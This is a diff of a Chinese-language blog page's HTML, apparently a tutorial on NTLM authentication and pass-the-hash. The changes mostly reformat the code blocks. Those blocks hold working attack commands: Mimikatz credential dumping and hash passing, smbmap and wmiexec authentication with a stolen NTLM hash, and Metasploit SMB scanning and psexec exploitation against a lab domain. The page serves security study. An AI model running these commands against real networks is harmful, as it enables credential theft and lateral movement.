@@ -63,7 +63,7 @@
         "description": "NTLM 是一种网络认证协议，与 NTLM Hash 的关系就是：NTLM 网络认证协议是以 NTLM Hash 作为根本凭证进行认证的协议。 0x01 NTLM 协议 In a Windows network, NT (New Technology) LAN Manager (NTLM) is a suite of Microsoft security protocols intended to provide authentication, integrity, and confidentiality to users. NTLM is……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  1452 ,
+        "wordCount":  1434 ,
         "image": ["https://oss.zjun.info/zjun.info/20210607093842.png","https://oss.zjun.info/zjun.info/2.png","https://oss.zjun.info/zjun.info/3.png","https://oss.zjun.info/zjun.info/4.png","https://oss.zjun.info/zjun.info/5.png","https://oss.zjun.info/zjun.info/6.png","https://oss.zjun.info/zjun.info/7.png","https://oss.zjun.info/zjun.info/8.png","https://oss.zjun.info/zjun.info/9.png"],
         "publisher": {
             "@type": "Organization",
@@ -324,105 +324,45 @@
 <h3 id="2-攻击利用"><a href="#2-攻击利用" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:2-攻击利用" class="headings">2. 攻击利用</a></h3>
 <p>下面介绍几种利用方式</p>
 <h4 id="mimikatz"><a href="#mimikatz" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:mimikatz" class="headings">Mimikatz</a></h4>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">privilege::debug
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">privilege::debug
 </span></span><span class="line"><span class="cl">sekurlsa::logonpasswords
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/2.png" alt="2"></p>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/2.png" alt="2"></p>
 <p>利用当前的 <code>NTLM hash</code> 进行传递：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sekurlsa::pth /user:administrator /domain:zjun.com /ntlm:79c89e2e7418467a4e7b55f8307260ca
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/3.png" alt="3"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sekurlsa::pth /user:administrator /domain:zjun.com /ntlm:79c89e2e7418467a4e7b55f8307260ca
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/3.png" alt="3"></p>
 <h4 id="smbmap"><a href="#smbmap" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:smbmap" class="headings">Smbmap</a></h4>
 <p><a href="https://github.com/ShawnDEvans/smbmap" target="_blank" rel="noopener">SMBMap</a>是一个 <code>SMB</code> 枚举工具，功能很强大，可以命令执行，同时也支持哈希传递。</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 smbmap.py -u administrator -p <span class="s1">&#39;00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca&#39;</span> -H 192.168.21.200 -r <span class="s1">&#39;C$\Users&#39;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 smbmap.py -u administrator -p <span class="s1">&#39;00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca&#39;</span> -H 192.168.21.200 -r <span class="s1">&#39;C$\Users&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># 前面的 32 个 0 表示的是 LM hash，但是目标主机是 win 2012 默认不开启 LM hash，所以这里随意填入 32 位长度的字符即可。</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/4.png" alt="4"></p>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/4.png" alt="4"></p>
 <h4 id="wmiexec"><a href="#wmiexec" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:wmiexec" class="headings">Wmiexec</a></h4>
 <p>python 源码：</p>
 <p><a href="https://github.com/SecureAuthCorp/impacket/edit/master/examples/wmiexec.py" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket/edit/master/examples/wmiexec.py</a></p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 wmiexec.py -hashes 00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca ZJUN/administrator@192.168.21.200 <span class="s2">&#34;whoami&#34;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 wmiexec.py -hashes 00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca ZJUN/administrator@192.168.21.200 <span class="s2">&#34;whoami&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># 前面的 32 个 0 表示的是 LM hash，但是目标主机是 win 2012 默认不开启 LM hash，所以这里随意填入 32 位长度的字符即可。</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/5.png" alt="5"></p>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/5.png" alt="5"></p>
 <p><code>windows exe</code> 版本：</p>
 <p><a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">https://github.com/maaaaz/impacket-examples-windows</a></p>
 <p><img src="https://oss.zjun.info/zjun.info/6.png" alt="6"></p>
 <h4 id="metasploit-psexec-模块"><a href="#metasploit-psexec-模块" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:metasploit-psexec-模块" class="headings">Metasploit psexec 模块</a></h4>
 <p>直接 <code>hash</code> 喷射整个内网段不免缓慢，由于其依赖于 <code>445</code> 或 <code>139</code> 等端口，所以可以先扫一下段内端口开放主机。</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use auxiliary/scanner/smb/smb_version
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use auxiliary/scanner/smb/smb_version
 </span></span><span class="line"><span class="cl"><span class="nb">set</span> rhosts 192.168.21.0/24
 </span></span><span class="line"><span class="cl"><span class="nb">set</span> threads <span class="m">100</span>
 </span></span><span class="line"><span class="cl">run
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/7.png" alt="7"></p>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/7.png" alt="7"></p>
 <p>再利用 <code>psexec</code> 模块进行哈希传递。</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/windows/smb/psexec
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/windows/smb/psexec
 </span></span><span class="line"><span class="cl"><span class="nb">set</span> lhost 192.168.0.102
 </span></span><span class="line"><span class="cl"><span class="nb">set</span> rhosts 192.168.21.200
 </span></span><span class="line"><span class="cl"><span class="nb">set</span> smbuser administrator
 </span></span><span class="line"><span class="cl"><span class="nb">set</span> smbpass 00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca
 </span></span><span class="line"><span class="cl">run
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/8.png" alt="8"></p>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/8.png" alt="8"></p>
 <p>此外还有如<a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">CrackMapExec</a>、<a href="https://github.com/brav0hax/smbexec" target="_blank" rel="noopener">smbexec</a>等工具。</p>
 <p>对于这一缺陷，微软发布了 <code>KB2871997</code> 补丁，在打了该补丁后，对于 <code>SID</code> 非 <code>500</code> 的账户，无论用户名， <code>Pass The Hash</code> 无法成功。</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wmic useraccount get name,sid
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/9.png" alt="9"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wmic useraccount get name,sid
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/9.png" alt="9"></p>
 
             </div>
 
